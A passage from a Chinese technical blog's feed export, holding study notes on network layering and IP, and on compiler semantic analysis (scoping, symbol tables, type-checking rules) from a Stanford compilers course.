excel"><span class="hljs-number">1</span>. Application<br><span class="hljs-number">2</span>. Transport<br><span class="hljs-number">3</span>. Network：[Data, headd<span class="hljs-symbol">er:</span> [from, to]]<br><span class="hljs-number">4</span>. Li<span class="hljs-symbol">nk:</span> 数据组织形式：Packet, Link层，是在路由之间的数据传递，<span class="hljs-symbol">eg:</span> wifi <span class="hljs-built_in">and</span> 以太网<br><br><br>=&gt; Rout<span class="hljs-symbol">er:</span> 路由从链路层解析网络层的数据，获取target，根据路由转发标寻找下一跳，包装好后形成新的Link数据包，继续转发<br><span class="hljs-number">3</span>. Network：[Data, headd<span class="hljs-symbol">er:</span> [from, to]]<br><span class="hljs-number">4</span>. Li<span class="hljs-symbol">nk:</span> 数据组织形式：Packet, Link层，是在路由之间的数据传递，<span class="hljs-symbol">eg:</span> wifi <span class="hljs-built_in">and</span> 以太网<br><br><br>=&gt; Rout<span class="hljs-symbol">er:</span> 路由从链路层解析网络层的数据，获取target，根据路由转发标寻找下一跳，包装好后形成新的Link数据包，继续转发<br><span class="hljs-number">3</span>. Network：[Data, headd<span class="hljs-symbol">er:</span> [from, to]]<br><span class="hljs-number">4</span>. Li<span class="hljs-symbol">nk:</span> 数据组织形式：Packet, Link层，是在路由之间的数据传递，<span class="hljs-symbol">eg:</span> wifi <span class="hljs-built_in">and</span> 以太网<br><br><br>=&gt;<br><span class="hljs-number">1</span>. Application<br><span class="hljs-number">2</span>. Transport<br><span class="hljs-number">3</span>. Network：[Data, headd<span class="hljs-symbol">er:</span> [from, to]]<br><span class="hljs-number">4</span>. Li<span class="hljs-symbol">nk:</span> 数据组织形式：Packet, Link层，是在路由之间的数据传递，<span class="hljs-symbol">eg:</span> wifi <span class="hljs-built_in">and</span> 以太网<br></code></pre></td></tr></table></figure><p>网络层是特殊的：因为必须要使用 <code>Internet Protocol</code></p><ul><li>IP尽最大努力转发数据报，但是不能保证</li><li>IP数据报可能会丢失，会无需，会损坏，这些都是没办法保证的</li></ul><p>IP是最重要的，IP是瘦身层，因为其他协议都有很多种类，<strong>但是IP就一种，为什么呢</strong>？</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>, smtp, ssh, ftp<br><span class="hljs-attribute">tcp</span>, udp, rtp<br><span class="hljs-attribute">IP</span><br><span class="hljs-attribute">Ethernet</span> Wifi DSL <span class="hljs-number">3</span>G <span class="hljs-number">5</span>G<br></code></pre></td></tr></table></figure><p>传输层：</p><ul><li>TCP：虽然IP不保证，但是TCP保证</li><li>UDP</li></ul><p>七层OSI模型：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">Application</span> <span class="hljs-operator">=</span>&lt; http<br><span class="hljs-attribute">Presention</span> <span class="hljs-operator">=</span>&gt; ASCII<br><span class="hljs-attribute">Session</span> <span class="hljs-operator">=</span>&gt; TCP<br><span class="hljs-attribute">Transport</span> <span class="hljs-operator">=</span>&gt; TCP<br><span class="hljs-attribute">Network</span> <span class="hljs-operator">=</span>&gt; IP<br><span class="hljs-attribute">Link</span>    <span class="hljs-operator">=</span>&gt; Link<br><span class="hljs-attribute">Physical</span> <span class="hljs-operator">=</span>&gt; Link<br></code></pre></td></tr></table></figure><p>IP模型：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lasso">Application<br>Transport: <span class="hljs-meta">[</span><span class="hljs-built_in">Data</span><span class="hljs-meta">]</span><span class="hljs-meta">[</span><span class="hljs-keyword">Header</span><span class="hljs-meta">]</span><br>Network    <span class="hljs-meta">[</span>   IP <span class="hljs-built_in">Data</span>  <span class="hljs-meta">]</span><span class="hljs-meta">[</span>IP <span class="hljs-keyword">Header</span><span class="hljs-meta">]</span><br>Link   <span class="hljs-meta">[</span>   <span class="hljs-keyword">Link</span> <span class="hljs-built_in">Data</span>           <span class="hljs-meta">]</span><span class="hljs-meta">[</span><span class="hljs-keyword">Link</span> <span class="hljs-keyword">Header</span><span class="hljs-meta">]</span><br></code></pre></td></tr></table></figure><p>​</p><table><thead><tr class="header"><th>性质</th><th>行为</th></tr></thead><tbody><tr class="odd"><td>Datagram</td><td>独立的路由包，包是一跳一跳的转发</td></tr><tr class="even"><td>不可信</td><td>包可能会丢失</td></tr><tr class="odd"><td>尽力</td><td>尽最大里交付数据</td></tr><tr class="even"><td>Connectionless</td><td>No per-flow state（连接是无状态的） 包可能乱序</td></tr></tbody></table><p>为什么IP模型如此简单？</p><ul><li>快</li><li>端到端原则</li><li>更方便自定义在其上封装一些定制的协议（可信的or不可信的）</li><li>实现的简单，能够适用于各种链路层协议</li></ul><p>IP模型的特点：</p><ul><li>防止循环转发（套娃）</li><li>如果数据太长，将会分割数据报</li><li>使用checksum减少错误分发的机会</li><li>允许更多的IP版本，ipv4, ipv6</li><li>允许自定义header</li></ul><p>Ipv4数据报格式：网上有自己查</p><ul><li>version</li><li>header len</li><li>Toatl Packet len</li><li>Packet ID</li><li>flags</li><li>flags offset</li><li>TTL</li><li>protocol ID</li><li>checksum</li><li>src ip addr</li><li>dest ip addr</li><li>options</li><li>padding</li><li>Data</li></ul><p>整体流程：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Client =&gt;<span class="hljs-built_in"> Server </span>(<span class="hljs-literal">No</span>, 么有直接连接)，一般是通过路由转发<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">IP </span>addr: 171.67.76.157<br>TCP port: 80<br><br><br>Server:<span class="hljs-built_in"></span><br><span class="hljs-built_in">IP </span>addr: 128.148.252.129<br>TCP port: 56567<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">Client </span>=&gt; router1 =&gt; router2 =&gt; <span class="hljs-built_in"> Server </span>(<span class="hljs-literal">No</span>, 么有直接连接)，一般是通过路由转发，每个路由里面都有路由表，如果没有找到则从默认路由转发<br></code></pre></td></tr></table></figure><h2 id="网络中的设计模式">网络中的设计模式</h2><h3 id="分组交换原理">分组交换原理</h3><p>将数据切割成小块（Packet）</p><blockquote><p>Packet: A self-contained unit of data that carries infomation for itto reach its destination</p></blockquote><p>分包转发(packetswitching)：每个到达的包都是相互独立的，如果这条链路是availble的，则服用；否则缓存数据包后，继续等待。</p><p>分包转发相当于让路由自己去做转发动作，可不可以在每个Packet里携带转发目的地信息呢？可以的，但是这种没有必要，占用了一定的数据，以及存在一定安全问题（会被诱导到不安全的网络）</p><p>分包转发的好处：</p><ul><li>交换机为每个数据包做单独的本地决策，不需要在数据包中指明路由</li><li>高效的链路共享</li><li>分包转发不需要为每个流量保存自己的状态，每个包都是自包含的</li></ul><h3 id="分层原则">分层原则</h3><p>将大系统切分成多个独立功能的部分</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">layer1</span> <span class="hljs-operator">=</span>&gt; layer2 <span class="hljs-operator">=</span>&gt; ... <span class="hljs-operator">=</span>&gt; layern<br></code></pre></td></tr></table></figure><p>好处：</p><ul><li>独立</li><li>顺序通信，从上到下，从下到上通信</li><li>上层为下层提供定义完整的服务，不需要了解下层是什么</li></ul><p>为什么要分层：</p><ul><li>Modularity</li><li>Well defined service</li><li>Reuse</li><li>Seperation of concerns</li><li>Continuous improvement</li></ul><h3 id="封装原则">封装原则</h3><p>Layer N data is payload to layer N - 1, eg:</p><ul><li>Http application payload in</li><li>a TCP transport segment in</li><li>an IP network packet in</li><li>a wifi link frame</li></ul><p>分层的好处：Encapsulation Flexibility</p><p>Encapsulation allows you to layer recursively</p><p>VPN:</p><ul><li>HTTP application payload in</li><li>a TCP transport segment in</li><li>an IP network packet in</li><li>a secured TLS presentation message in</li><li>a TCP transport segment in</li><li>an IP network packet in</li><li>an Ethernet link frame</li></ul><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vbscript">[link, ip, tcp, tls, ip, tcp, http]<br><br><span class="hljs-keyword">to</span> <span class="hljs-keyword">next</span> hop <span class="hljs-keyword">to</span> vpn gateway, <span class="hljs-keyword">to</span> vpn gateway, <span class="hljs-keyword">to</span> vpn gateway, <span class="hljs-keyword">to</span> web <span class="hljs-built_in">server</span>, <span class="hljs-keyword">to</span> web <span class="hljs-built_in">server</span><br></code></pre></td></tr></table></figure><h2 id="字节顺序">字节顺序</h2><h2 id="ipv4-vs-ipv6">IPv4 vs IPv6</h2><h2 id="最长前缀匹配">最长前缀匹配</h2><h2 id="地址解析协议">地址解析协议</h2><h2 id="总结">总结</h2>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机网络，计算机基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WebAssembly入门</title>
    <link href="/emocoder/2023/06/06/WebAssembly%E5%85%A5%E9%97%A8/"/>
    <url>/emocoder/2023/06/06/WebAssembly%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>斯坦福cs231(编译原理)の 5 Semantic Analysis</title>
    <link href="/emocoder/2023/06/04/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%BA%94/"/>
    <url>/emocoder/2023/06/04/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%BA%94/</url>
    
    <content type="html"><![CDATA[<h2 id="type-checking-rules-and-how-to-implement"><strong>Type CheckingRules and How to Implement ?</strong></h2><p>Cool type can be implemented in a single traversal over the AST</p><ul><li>Type environment is passed down the tree (From parent tochild)，环境自上而下是在不断扩增的</li><li>Types are passed up the tree from (From child toparent)，类型是自底向上推导和检查的</li></ul><p>🌰： <span class="math display">\[\frac{O,M,C\vdash e_1:Int \quad O,M,C\vdash e_2:Int }{O,M,C\vdash e_1 +e_2:Int }\]</span></p><blockquote><p>Environment(Object, Method, Class),环境包括当前对象，当前方法及当前类</p></blockquote><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs smali">TypeCheck(Envirment, e1 + e2) = &#123;<br>T1 = TypeCheck(Envirment, e1)<br>T2 = TypeCheck(Envirment, e2)<br><span class="hljs-built_in">check </span>T1 == T2 == Int<br><span class="hljs-built_in">return </span>Int<br>&#125;<br></code></pre></td></tr></table></figure><p>🌰： <span class="math display">\[\begin{equation}\begin{aligned}\frac{O,M,C\vdash e_0:T_0 \quadO[T/x],M,C\vdash e_1:T_1  \quadT_0 &lt;= T}{O,M,C\vdash e_1 + e_2:Int }\end{aligned}\end{equation}\]</span></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">TypeCheck(Envirment, <span class="hljs-params">let</span> <span class="hljs-params">x</span>: T &lt;- <span class="hljs-params">e0</span> <span class="hljs-params">in</span> <span class="hljs-params">e1</span>)</span> = &#123;<br>T0 = <span class="hljs-constructor">TypeCheck(Envirment, <span class="hljs-params">e0</span>)</span><br>T1 = <span class="hljs-constructor">TypeCheck(Envirment.<span class="hljs-params">add</span>(&#123;<span class="hljs-params">x</span>: T&#125;)</span>, e1)<br>check <span class="hljs-constructor">SubType(T0, T)</span><br>return T1<br>&#125;<br><br>自上而下，environment不断扩增，自底向上检查类型<br></code></pre></td></tr></table></figure><h2 id="introduction-to-semantic-analysis">Introduction to SemanticAnalysis</h2><ul><li><p>Lexical analysis</p><ul><li>Detects inputs with illegal tokens</li></ul></li><li><p>Parsing</p><ul><li>Detects inputs with ill-formed parse trees</li></ul></li><li><p>Semantic analysis</p><ul><li>Last. Front end phase</li><li>Catched all remaining errors</li></ul></li></ul><p>Why do semantic analysis ?</p><ul><li>Parsing can't catch some errors</li><li><strong>Some langaguage constructs not context-free</strong></li></ul><blockquote><p><a href="https://www.zhihu.com/question/21833944">(2 封私信 / 25条消息) 应该如何理解「上下文无关文法」？ - 知乎 (zhihu.com)</a></p></blockquote><p>Semantic analysis will do ?</p><ul><li>All identifiers are declared</li><li>Type checking</li><li>Inheritance relationships checking</li><li>Classes defined ony once</li><li>Methods in a class defined only once</li><li>Reserved identifiers are not misused</li><li>...</li></ul><h2 id="静态作用域">静态作用域</h2><p>Matching static declarations with uses</p><ul><li>Important static analyisis step in most language</li><li>including COOL</li></ul><p>🌰：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">let</span> y: String &lt;- <span class="hljs-string">&quot;abc&quot;</span> <span class="hljs-keyword">in</span> y + <span class="hljs-number">3</span> <span class="hljs-comment">// 在后面的语句里y为string类型</span><br><br><span class="hljs-keyword">let</span> y: <span class="hljs-built_in">Int</span> <span class="hljs-keyword">in</span> x + <span class="hljs-number">3</span> <span class="hljs-comment">// 没有看到x的定义，将会报错</span><br></code></pre></td></tr></table></figure><blockquote><p>The scope of an identifier is the portion of a program in which thatidentifier is accessible</p></blockquote><p>计算机领域里变量作用域指的是程序中变量的起作用(可以get)的一段范围</p><p>不同作用域里可存在同名变量，同一个作用域不可出现不同名变量</p><p>一个变量的作用域范围是有限的</p><p>许多语言都是静态作用域：</p><p>作用域仅仅依赖程序文本，根据变量在程序文本的位置决定变量的作用域，没有任何运行时决定的行为，eg:Cool</p><p>动态作用域：</p><p>Lisp: Lisp has changed to mostly static scoping</p><p>Scope depends on execution of the program</p><p>🌰：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs llvm">let <span class="hljs-keyword">x</span>: Int &lt;- <span class="hljs-number">0</span> in<br>&#123;<br><span class="hljs-keyword">x</span><span class="hljs-comment">; =&gt;&gt;&gt;&gt;&gt;&gt; 1</span><br>let <span class="hljs-keyword">x</span>: Int &lt;- <span class="hljs-number">1</span> in<br><span class="hljs-keyword">x</span><span class="hljs-comment">; =&gt;&gt;&gt;&gt; 2</span><br><span class="hljs-keyword">x</span><span class="hljs-comment">; =&gt;&gt;&gt;&gt;&gt;&gt; 1</span><br>&#125;<br><br>上面<span class="hljs-number">1</span>号<span class="hljs-keyword">x</span>和<span class="hljs-number">2</span>号<span class="hljs-keyword">x</span>是不同的作用域里<span class="hljs-keyword">x</span><br><br>动态作用域里的变量总是指向离它最近的变量<br><br>g(y) <span class="hljs-operator">=</span> let a &lt;- <span class="hljs-number">4</span> in f(<span class="hljs-number">3</span>)<span class="hljs-comment">;</span><br>f(<span class="hljs-keyword">x</span>) <span class="hljs-operator">=</span> a <span class="hljs-operator">=</span>&gt;&gt;&gt;&gt;&gt; a <span class="hljs-operator">=</span> <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>Cool identifier bindings are introduced by:</p><ul><li>Class declarations (introduce class names)</li><li>Method declarations (introduce method names)</li><li>Let declarations (introduce object id's)</li><li>Formal declarations (introduce object id's)</li><li>Attribute declarations (introduce object id's)</li><li>Case declarations (introduce object id's)</li></ul><p>Cool 的标识符并不都是允许嵌套的</p><p>比如类定义不允许嵌套，类名使用前必须定义</p><h2 id="静态作用域实现符号表">静态作用域实现（符号表）</h2><p>Much of semantic analysis can be expressed as a recursive descent ofon an AST</p><ul><li>Before: Process an AST node n</li><li>Recurse: Process the children of n</li><li>After: Finish processing the AST node n</li></ul><p>When performing semantic analysis on a portion of the AST, we need toknow which identifiers are defined</p><p>当在AST的某部分上执行语义分析时，需要知道哪些标识符已经被定义了。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">let</span> x: Int &lt;- <span class="hljs-number">0</span> <span class="hljs-function"><span class="hljs-keyword">in</span> e</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">let</span> <span class="hljs-title">x</span>(<span class="hljs-params">sym</span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">init</span></span> = <span class="hljs-number">0.</span>(sym)     e(sym + x)<br><br>x <span class="hljs-keyword">is</span> defined <span class="hljs-keyword">in</span> subtree e<br></code></pre></td></tr></table></figure><p><code>Recall: let x: Int &lt;- 0 in e</code></p><p>Idea:</p><ul><li>Before processing e, add definition of x to current definitions,overriding any other definition of x</li><li>Recurse</li><li>After processing e, remove definition of x and restore olddefinition of x</li></ul><p>a symbol table is a data structure that tracks the current bindingsof identifiers</p><p>简单的实现可以使用stack</p><ul><li><code>Add_symbol(x)</code></li><li><code>Find_symbol(x) search stack, starting from top fro x, return x or NULL if none found</code></li><li><code>Remove() pop from ths stack</code></li><li><code>exit_scope() exit current scope</code></li><li><code>Check_scope(x) true if x defined in current scope</code></li></ul><p>在COOL里使用stack即可对let声明的变量进行处理</p><p>每次用let声明一个变量，即push入stack，而且也允许嵌套，每次退出当前let范围，即pop出变量；</p><p>但是对于函数确不好使用，比如函数参数，一次有多个参数，并且有重名的参数，所以得一次push多个变量，但是多个变量是在同一个层级里，而stack的解决方案默认一个变量一个层级</p><blockquote><p>class names can be used before being defined in COOL</p><p>solution：two passes to tranversal on AST</p><ul><li>Pass1: Gather all class names</li><li>Pass2: Do the checking</li></ul></blockquote><h2 id="类型">类型</h2><p>什么是类型，不同的语言对于类型定义不同，但通常意义上，一致认为被定义如下：</p><ul><li>一些值的集合（数据）</li><li>可操作这些值的一些操作（算法/函数/方法）</li></ul><p>必须确保在转化为机器语言之前做好类型检查哦，因为机器语言执行指令不会做任何检查。语言类型系统知名里在哪些类型上的哪些操作是合法的。语言的类型检查目的就是确保在正确的类型上执行正确的操作。</p><p>类型检查时期：</p><ul><li>编译时期执行类型检查：C, COOL, Java</li><li>运行时类型检查：程序执行的时候执行类型检查, Python, Lisp, Perl</li><li>无类型检查：machine code</li></ul><p>静态类型检查 vs 动态类型检查</p><ul><li>静态检查可以在编译时期捕获错误</li><li>避免运行时错误</li></ul><p>动态检查：</p><ul><li>静态类型检查是有局限性的，有些语句在静态类型不好检查出来，比如继承的时候，子类调用父类的方法</li></ul><p>现代编程语言很多结合了两者，如：</p><p>C，java可以使用unsafe逃脱静态检查</p><p>People retrofit static typing to dynamically typed languages fordebugging or optimization</p><p>类型检查：验证类型的合法性</p><p>类型推断：自动推断和填充缺失的类型信息</p><p>之前已经见过一些formal notions，比如：</p><ul><li>Regular expressions</li><li>Context-free grammars</li></ul><p>类型检查也有一套标准的逻辑推导规则：</p><p>推导规则具有如下形式：</p><p><em>If Hypothesis is true, then Conclusion is true</em></p><p>类型检查就是通过这样的推理：</p><p><em>If E1 and E2 have certain types, then E3 has a certaintype</em></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs excel">^ =&gt; <span class="hljs-built_in">and</span><br>=&gt; <span class="hljs-built_in">if</span>-then<br><span class="hljs-symbol">x:</span> <span class="hljs-built_in">T</span> =&gt; x has <span class="hljs-built_in">type</span> &#x27;<span class="hljs-built_in">T</span>&#x27;<br></code></pre></td></tr></table></figure><blockquote><p>if e1 has type int and e2 type int, then e1 + e2 has type int=======&gt;</p><p>e1 has type ^ e2 has type int =&gt; e1 + e2 has type int=======&gt;</p><p>(E1: int ^ e2 : int) =&gt; e1 + e2: int</p></blockquote><p>the statement <code>(E1: int ^ e2 : int) =&gt; e1 + e2: int</code> isa special case of<code>hypothesis1 ^ ... ^ hypothesisn =&gt; Conclusion</code></p><p>一般情况下，上面的推导规则写出如下符号形式： <spanclass="math display">\[\frac{\vdash hypothesis1 \vdash hypothesis2 ... \vdashhypothesisn}{\vdash Conslusion}\]</span> <span class="math inline">\(\vdash\)</span> means ''it isprovable that ..."</p><p>看几个简单的推导规则： <span class="math display">\[\frac{i \quad is \quad an \quad interger \quad literal}{\vdash i: int}\]</span></p><p><span class="math display">\[\frac{e1: int \quad e2: int}{\vdash e1 + e2: int}\]</span></p><p>类型检查可以很好的基于AST来做：</p><p>如果已经证明了子表达式的类型，那么父节点的类型也就很好地得到，所以类型检查和推断是自底向上做的</p><h2 id="类型环境">类型环境</h2><p>在类型推导/检查中，有的时候一个变量的类型信息需要更多的信息才能获得该变量的类型，所以在我们的推导规则里需要加入更多的类型信息——类型环境，类型环境给予了自由变量更多的相关类型信息</p><p>类型环境：a fucntion from object identifiers to Types(即标识符到类型的映射)</p><p>自由变量：如果一个表达式里存在一个变量没有被定义，那么该变量就是自由变量</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">let</span> y: <span class="hljs-built_in">int</span> &lt;- <span class="hljs-number">0</span> <span class="hljs-keyword">in</span> x + y<br>这里<span class="hljs-keyword">let</span>限定下，x是未定义的，而y是<span class="hljs-built_in">int</span>类型且初始化为<span class="hljs-number">0</span>，在进行类型检查的时候，我们只有拥有了前面关于x的信息，才能知道x的类型<br></code></pre></td></tr></table></figure><p>let O be function from Object idenfiers to types, notion as follow:<span class="math display">\[O\vdash e: T\]</span> 读作：在环境O下，可以证明e是T类型</p><p>单点修改： <span class="math display">\[\begin{equation}\begin{aligned}\frac{O[T/x]\vdash e_1:int  \quad}{O\vdash e_1 + e_2:Int }\end{aligned}\end{equation}\]</span></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">表示<br>O[T/<span class="hljs-keyword">x</span>](<span class="hljs-keyword">x</span>) <span class="hljs-operator">=</span> int<br>O[T/<span class="hljs-keyword">x</span>](y) <span class="hljs-operator">=</span> y (<span class="hljs-keyword">x</span> !<span class="hljs-operator">=</span> y)<br></code></pre></td></tr></table></figure><p>实际上类型环境O可以由之前的Symbol table实现，因为</p><ul><li>类型环境给予当前作用域内部标识符类型（和作用域类型，只不过作用域是记录标识符）</li><li>类型环境也是自上向下不断扩增和单点修改</li><li>但是类型检查和推断是自底向上的</li></ul><h2 id="subtypings">Subtypings</h2><p>subtypings 主要用于继承类型1判断 <span class="math display">\[\begin{equation}\begin{aligned}\frac{O\vdash e_0:T_0  \quadO[T_0/x]\vdash e_1:T_1  \quad}{O\vdash let \quad x: T_0 = e_0 \quad in \quad e_1: T_1 }\end{aligned}\end{equation}\]</span> 在类上定义关系：&lt;=</p><ul><li>X &lt;= Y</li><li>X &lt;= Y if X inherits from Y</li><li>X &lt;= Z if X &lt;= Y and Y &lt;= Z</li></ul><p><span class="math display">\[\begin{equation}\begin{aligned}\frac{O\vdash e_0:T_0  \quadO[T_0/x]\vdash e_1:T_1  \quadT_0 &lt;= T}{O\vdash let \quad x: T_0 = e_0 \quad in \quad e_1: T_1 }\end{aligned}\end{equation}\]</span></p><p>属性初始化： <span class="math display">\[\begin{equation}\begin{aligned}\frac{O_c(x) = T_0  \quadO_C\vdash e_1:T_1  \quadT_1 &lt;= T0}{O\vdash x: T_0 = e_1 }\end{aligned}\end{equation}\]</span></p><p>考虑 <code>if e0 then e1 else e2 fi</code></p><p>表达式的结果要么e1要么e2，对应的类型要么是e1的类型要么是e2的类型</p><p>那么整个if-else表达式返回什么类型？</p><p>最好的方法是返回e1和e2的最小上界类型（least upper type）</p><p>least upper bound: lub(X, Y)，表示X和Y的最小上界类型，</p><p>if X &lt;= Z ^ Y &lt;= Z: Z is an upper bound</p><p>If X &lt;= Z' ^ Y &lt;= Z', Z &lt;= Z': Z is an upper bound</p><p>COOL里，两个类型的最小上界是它们继承树里最近公共祖先</p><p><span class="math display">\[\begin{equation}\begin{aligned}\frac{O\vdash e_0:Bool  \quadO\vdash e_1:T_1  \quadO\vdash e_1:T_2  \quad}{O\vdash if \quad e_0 \quad then \quad e_1 \quad else \quad e_2 \quadfi \quad fi: lub(T_1, T_2) }\end{aligned}\end{equation}\]</span></p><h2 id="typing-methods">Typing Methods</h2><p><span class="math display">\[dispatch:\begin{equation}\begin{aligned}\frac{O\vdash e_0:T_0  \quadO\vdash e_1:T_1  \quad... \quadO\vdash e_n:T_n  \quad}{O\vdash e_0.f(e_1, ... e_n): ? }\end{aligned}\end{equation}\]</span></p><p>不知道任何关于f的信息，如何知道f的返回值类型？</p><p>In cool, method and object identifiers live in different namespaces</p><ul><li>A method foo and an object foo can coexisted in the same scope</li></ul><p>In the type rules, this is reflected by a seperate mapping M formethod signatures <span class="math display">\[M(C, f) = (T_1, ... T_n, T_{n+1}) means \quad in \quad Class \quad C\quad there \quad is \quad \\ a \quad method \\ f: \quadf(x_1: T_1, ... x_n: T_n): T_{n+1}\]</span></p><p>dispatch <span class="math display">\[dispatch:\begin{equation}\begin{aligned}\frac{O\vdash e_0:T_0  \quadO\vdash e_1:T_1  \quad... \quadO\vdash e_n:T_n  \quadT_i &lt;= T_{i&#39;} 1 &lt;= i &lt;= n \quadM(T_0, f) = (T_{1&#39;}, ... T_{n&#39;}, T_{n+1})}{O\vdash e_0.f(e_1, ... e_n): T_{n+1} }\end{aligned}\end{equation}\]</span></p><p>静态dispatch <span class="math display">\[static dispatch:\begin{equation}\begin{aligned}\frac{O\vdash e_0:T_0  \quadO\vdash e_1:T_1  \quad... \quadO\vdash e_n:T_n  \quadT_0 &lt;= T \quadT_i &lt;= T_{i&#39;} 1 &lt;= i &lt;= n \quadM(T_0, f) = (T_{1&#39;}, ... T_{n&#39;}, T_{n+1})}{O\vdash e_0@T.f(e_1, ... e_n): T_{n+1} }\end{aligned}\end{equation}\]</span> 最终结合方法环境，变量环境和类， <span class="math display">\[\begin{equation}\begin{aligned}\frac{O, M, C\vdash e_1:int  \quadO, M, C\vdash e_2:int  \quad}{O, M, C\vdash e1 + e2: int }\end{aligned}\end{equation}\]</span> 上面的规则仅适用于COOL</p><blockquote><p>General themes:</p><ul><li>Type rules are defined on the structure of expressions</li><li>Types of varaibles are modeled by an environment</li></ul></blockquote><h2 id="static-type-vs-dynamic-type">Static Type vs Dynamic Type</h2><p>静态类型检查：</p><p>可以在编译时期发现一些常见的错误，但是也有一些不是错误的代码被识别出来，报告错误，这个时候需要动态类型检查，但是实际上为了让有些不是错误的代码能够通过静态类型检查，需要一些特殊的方法：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> <span class="hljs-title">interits</span> <span class="hljs-title">A</span> </span>&#123;&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>x: <span class="hljs-type">A </span>&lt;- <span class="hljs-keyword">new</span> <span class="hljs-type">A</span>; <span class="hljs-comment">// 静态检查可以通过，左右类型一致</span><br>...<br>x &lt;- <span class="hljs-keyword">new</span> <span class="hljs-type">V</span>; <span class="hljs-comment">// 静态检查通不过，左右类型不一致</span><br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>理想情况下，对于所有的表达式：dynamic_type(E) &lt;=static_type(E)</p><p>对于任意表达式E，dynamic_type(E) &lt;=static_type(E)，表示表达式E的静态类型检查得到的类型是对应表达式动态检查得到得类型的父类</p><p>All operations that can be used on an object if type C can also beused on an object of type C' &lt;= C</p><ul><li><p>Such as fetching the value of attribute</p></li><li><p>Or invoking a method on the object</p></li><li><p>Subclass only add attributes or methods</p></li><li><p>```</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>  <br><br><br><br>## Self Type<br><br>考虑如下代码：<br><br>```java<br><span 